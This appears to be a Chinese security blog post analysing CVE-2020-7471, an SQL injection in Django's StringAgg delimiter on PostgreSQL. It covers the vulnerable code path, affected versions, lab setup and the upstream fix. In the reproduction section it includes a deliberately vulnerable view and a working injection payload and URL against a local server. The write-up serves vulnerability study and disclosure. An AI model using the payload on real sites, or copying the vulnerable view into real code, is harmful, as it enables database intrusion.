<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2020-7471 漏洞分析笔记 | Gridea</title>
<link rel="shortcut icon" href="https://c0n6w3i.github.io//favicon.ico?v=1628818360718">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://c0n6w3i.github.io//styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CVE-2020-7471 漏洞分析笔记 | Gridea - Atom Feed" href="https://c0n6w3i.github.io//atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="0x01 简介
Django 是一个常用的 python web 服务框架.
0x02 漏洞概述
这次是由于 Django 没有过滤输入而引起的 SQL 注入漏洞, 漏洞位置是在 contrib.postgres.aggregates.St..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://c0n6w3i.github.io/">
  <img class="avatar" src="https://c0n6w3i.github.io//images/avatar.png?v=1628818360718" alt="">
  </a>
  <h1 class="site-title">
    Gridea
  </h1>
  <p class="site-description">
    温故而知新
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CVE-2020-7471 漏洞分析笔记
            </h2>
            <div class="post-info">
              <span>
                2020-06-07
              </span>
              <span>
                6 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h2 id="0x01-简介">0x01 简介</h2>
<p>Django 是一个常用的 python web 服务框架.</p>
<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
<p>这次是由于 Django 没有过滤输入而引起的 SQL 注入漏洞, 漏洞位置是在 <code>contrib.postgres.aggregates.StringAgg</code> 函数的 delimiter.</p>
<p>这个函数对应 postgreSQL 里的 STRING_AGG 函数, 第三个参数(delimiter) 是注入点.</p>
<p>举个例子：</p>
<pre><code class="language-python">    results = Question.objects.all().values('text_1').annotate(test=StringAgg('text_2', delimiter=&quot;-&quot;))
</code></pre>
<p>这么一个操作会生成这样一个SQL query:</p>
<pre><code class="language-sql">SELECT &quot;polls_question&quot;.&quot;text_1&quot;, STRING_AGG(&quot;polls_question&quot;.&quot;text_2&quot;, '-') AS &quot;test&quot; FROM &quot;polls_question&quot; GROUP BY &quot;polls_question&quot;.&quot;text_1&quot;
</code></pre>
<p>这时把 <code>'-'</code> 替换成 要注入的语句就行了, 此处是获取数据库版本信息</p>
<pre><code class="language-sql">SELECT &quot;polls_question&quot;.&quot;text_1&quot;, STRING_AGG(&quot;polls_question&quot;.&quot;text_2&quot;, '-\') FROM (SELECT  text_1, version() AS text_2 FROM &quot;polls_question&quot;) AS polls_question GROUP BY &quot;polls_question&quot;.&quot;text_1&quot; -- \') AS &quot;test&quot; FROM &quot;polls_question&quot; GROUP BY &quot;polls_question&quot;.&quot;text_1&quot;
</code></pre>
<p>首先,作为漏洞的切入点, 系统会先 initialize 一个 StringAgg Object.</p>
<pre><code class="language-python">class StringAgg(OrderableAggMixin, Aggregate):
    function = 'STRING_AGG'
    template = &quot;%(function)s(%(distinct)s%(expressions)s, '%(delimiter)s'%(ordering)s)&quot;
    allow_distinct = True

    def __init__(self, expression, delimiter, **extra):
        super().__init__(expression, delimiter=delimiter, **extra)

    def convert_value(self, value, expression, connection):
        if not value:
            return ''
        return value
</code></pre>
<p>然后运行 query.annotate 函数</p>
<pre><code class="language-python">    def annotate(self, *args, **kwargs):
        &quot;&quot;&quot;
        Return a query set in which the returned objects have been annotated
        with extra data or aggregations.
        &quot;&quot;&quot;
</code></pre>
<p>经过一堆验证和生成 group by 之类的操作之后, query 就算是生成好了</p>
<p>获取 result 的时候直接执行 fetch_all 函数</p>
<p>之后经过一些跳转, 执行 result_iter 函数</p>
<pre><code class="language-python">class ValuesIterable(BaseIterable):
    &quot;&quot;&quot;
    Iterable returned by QuerySet.values() that yields a dict for each row.
    &quot;&quot;&quot;
    def __iter__(self):
        queryset = self.queryset
        query = queryset.query
        compiler = query.get_compiler(queryset.db)
        # extra(select=...) cols are always at the start of the row.
        names = [
            *query.extra_select,
            *query.values_select,
            *query.annotation_select,
        ]
        indexes = range(len(names))
        for row in compiler.results_iter(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size):
            yield {names[i]: row[i] for i in indexes}
</code></pre>
<p>这之后会再 <code>compiler.py</code> 里执行一堆用于拼接 sql query 的函数<br>
当执行完as_sql 函数时sql就生成完了. 最后在 execute_sql 函数中执行 sql</p>
<pre><code class="language-python">def execute_sql(self, result_type=MULTI, chunked_fetch=False, chunk_size=GET_ITERATOR_CHUNK_SIZE):
        &quot;&quot;&quot;
        Run the query against the database and return the result(s). The
        return value is a single data item if result_type is SINGLE, or an
        iterator over the results if the result_type is MULTI.

        result_type is either MULTI (use fetchmany() to retrieve all rows),
        SINGLE (only retrieve a single row), or None. In this last case, the
        cursor is returned if any query is executed, since it's used by
        subclasses such as InsertQuery). It's possible, however, that no query
        is needed, as the filters describe an empty set. In that case, None is
        returned, to avoid any unnecessary database interaction.
        &quot;&quot;&quot;
        result_type = result_type or NO_RESULTS
        try:
            sql, params = self.as_sql()
            if not sql:
                raise EmptyResultSet
        except EmptyResultSet:
            if result_type == MULTI:
                return iter([])
            else:
                return
        if chunked_fetch:
            cursor = self.connection.chunked_cursor()
        else:
            cursor = self.connection.cursor()
        try:
            cursor.execute(sql, params)
        except Exception:
            # Might fail for server-side cursors (e.g. connection closed)
            cursor.close()
            raise

        if result_type == CURSOR:
            # Give the caller the cursor to process and close.
            return cursor
        if result_type == SINGLE:
            try:
                val = cursor.fetchone()
                if val:
                    return val[0:self.col_count]
                return val
            finally:
                # done with the cursor
                cursor.close()

</code></pre>
<h2 id="0x03-影响版本">0x03 影响版本</h2>
<p>Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3</p>
<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
<p>简单来说就是搭建一个 Django 服务和一个 PostgreSQL 数据库.<br>
Django 版本是 3.0.2<br>
<code>pip install django==3.0.2</code><br>
此处 Django 服务是直接照着<a href="https://docs.djangoproject.com/en/3.0/intro/tutorial01/">官方文档</a>搭建的.<br>
数据库是直接从<a href="https://www.postgresql.org/">官网</a>上下载的</p>
<p>因为大部分文件都是靠 Django 生成的,所以这里就直接把环境放到 <a href="https://github.com/C0n6w3i/Django-Notes">github</a> 上了.<br>
运行前修改下 <code>settings.py</code> 里面 Database 配置就行<br>
先启动 PostgreSQL 服务<br>
然后再运行<br>
下载好之后运行这几个命令初始化数据库之类的</p>
<pre><code class="language-bash">python manage.py migrate
python manage.py makemigrations polls
python manage.py sqlmigrate polls 0001
python manage.py migrate
</code></pre>
<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
<p>这里就随便写一个,用的是 URL 提交参数</p>
<pre><code class="language-python">def index(request, payload):
    # payload = &quot;-&quot;
    # payload = '-\') FROM (SELECT text_1, version() AS text_2 FROM &quot;polls_question&quot;) AS polls_question GROUP BY &quot;polls_question&quot;.&quot;text_1&quot; -- '
    results = Question.objects.all().values('text_1').annotate(test=StringAgg('text_2', delimiter=payload))
    res = &quot;&quot;
    for e in results:
        res += str(e) + &quot;\n&quot;
    return HttpResponse(&quot;Payload is : &quot; + payload + &quot;\nResult is : &quot; + res, content_type=&quot;text/plain&quot;)
</code></pre>
<p>执行 Django 服务：<br>
<img src="https://c0n6w3i.github.io//post-images/1591627868451.png" alt="" loading="lazy"><br>
然后去 <code>http://127.0.0.1:8000/polls/-</code><br>
<img src="https://c0n6w3i.github.io//post-images/1591627894827.png" alt="" loading="lazy"></p>
<p>执行注入 <code>http://127.0.0.1:8000/polls/-')%20FROM%20(SELECT%20text_1,%20version()%20AS%20text_2%20FROM%20%22polls_question%22)%20AS%20polls_question%20GROUP%20BY%20%22polls_question%22.%22text_1%22%20--</code><br>
<img src="https://c0n6w3i.github.io//post-images/1591627911892.png" alt="" loading="lazy"></p>
<h2 id="0x06-修复方式">0x06 修复方式</h2>
<p>虽说 SQL prepared statement 可以完美防止 SQL 注入, 但是这种添加 function 的场景太过复杂,所以 Django 是用 Value函数来对 delimiter 进行过滤.<br>
这是新版 StringAgg</p>
<pre><code class="language-python">class StringAgg(OrderableAggMixin, Aggregate):
    function = 'STRING_AGG'
    template = '%(function)s(%(distinct)s%(expressions)s %(ordering)s)'
    allow_distinct = True

    def __init__(self, expression, delimiter, **extra):
        delimiter_expr = Value(str(delimiter))
        super().__init__(expression, delimiter_expr, **extra)

    def convert_value(self, value, expression, connection):
        if not value:
            return ''
        return value
</code></pre>
<p>所以修复方式就是尽快升级或者别用postgreSQL</p>
<h2 id="参考链接">参考链接：</h2>
<p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471</p>
<p>https://xz.aliyun.com/t/7218</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-%E7%AE%80%E4%BB%8B">0x01 简介</a></li>
<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">0x02 漏洞概述</a></li>
<li><a href="#0x03-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x03 影响版本</a></li>
<li><a href="#0x04-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x04 环境搭建</a></li>
<li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">0x05 漏洞复现</a></li>
<li><a href="#0x06-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F">0x06 修复方式</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接：</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://c0n6w3i.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/">
              <h3 class="post-title">
                Fastjson 反序列化 + JNDI 注入 实现远程代码执行
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://c0n6w3i.github.io//atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
